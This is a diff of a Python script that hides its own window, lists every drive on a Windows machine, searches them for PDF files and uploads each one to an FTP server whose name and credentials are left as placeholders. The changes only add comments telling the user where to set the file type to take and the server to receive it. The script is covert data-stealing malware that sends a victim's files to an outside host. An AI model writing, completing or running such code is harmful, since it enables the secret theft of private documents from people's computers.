@@ -10,7 +10,7 @@ import win32gui, win32con
 The_program_to_hide = win32gui.GetForegroundWindow()
 win32gui.ShowWindow(The_program_to_hide , win32con.SW_HIDE)
 
-lookfor = [".pdf"]
+lookfor = [".pdf"] #Assign the extension of the file type which you want to upload.
 
 def get_drives():
     response = popen("wmic logicaldisk get caption")
@@ -30,7 +30,7 @@ def search_file(drive):
             if file.endswith('.pdf'):
                 hello = join(root, file)
                 try:
-                    session = ftplib.FTP('SERVER NAME','SERVER ID','SERVER PASSWORD')
+                    session = ftplib.FTP('SERVER NAME','SERVER ID','SERVER PASSWORD') #All the details where you want to get uploaded.
                     file2 = open(hello,'rb')
                     session.storbinary('STOR %s' %file, file2)
                     file2.close()
